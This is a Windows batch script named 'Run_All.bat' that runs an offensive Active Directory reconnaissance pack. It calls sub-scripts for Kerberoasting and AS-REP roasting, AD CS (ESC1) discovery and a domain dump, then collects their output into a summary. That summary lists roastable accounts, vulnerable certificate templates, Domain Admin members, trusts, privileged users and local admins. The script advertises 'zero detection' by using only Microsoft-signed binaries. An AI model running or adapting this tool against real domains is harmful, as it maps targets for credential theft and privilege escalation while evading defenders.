@echo off
setlocal enabledelayedexpansion
REM ============================================
REM  Run_All.bat - Master runner for signed-binary recon pack
REM  ALL commands use Microsoft-signed executables
REM  - dsquery.exe  dsget.exe  net.exe  nltest.exe
REM  - whoami.exe  klist.exe  certutil.exe  findstr  find  type
REM  No csc.exe, no custom code, no PowerShell.
REM ============================================

set "OUT=%TEMP%"
echo.
echo === SIGNED-BINARY RECON (zero detection) ===
echo Output: %OUT%
echo.

call "1_Kerberoast_ASREP.bat" <nul 2>nul
echo.
call "2_ADCS_Recon.bat" <nul 2>nul
echo.
call "3_AD_Dump.bat" <nul 2>nul

echo.
echo ========================================
echo    SUMMARY
echo ========================================
echo.
echo --- KERBEROAST / AS-REP TARGETS ---
type "%OUT%\kerb_spn.log" 2>nul
echo.
type "%OUT%\kerb_asrep.log" 2>nul
echo.
echo --- AD CS VULNERABILIES ---
type "%OUT%\adcs_esc1_candidates.log" 2>nul
echo.
type "%OUT%\adcs_enterprise_cas.log" 2>nul
echo.
echo --- DOMAIN STRUCTURE ---
type "%OUT%\ad_dcs.log" 2>nul
echo.
type "%OUT%\ad_da_members.log" 2>nul
echo.
echo --- Domain Trusts ---
type "%OUT%\ad_trusts.log" 2>nul
echo.
echo --- Privileged users + groups ---
type "%OUT%\ad_priv_users.log" 2>nul
echo.
echo --- Local admins ---
type "%OUT%\ad_local_admins.log" 2>nul
echo.
echo ========================================
echo ALL LOGS IN: %OUT%
echo ========================================
dir "%OUT%\kerb_*" "%OUT%\adcs_*" "%OUT%\ad_*" 2>nul
pause
endlocal
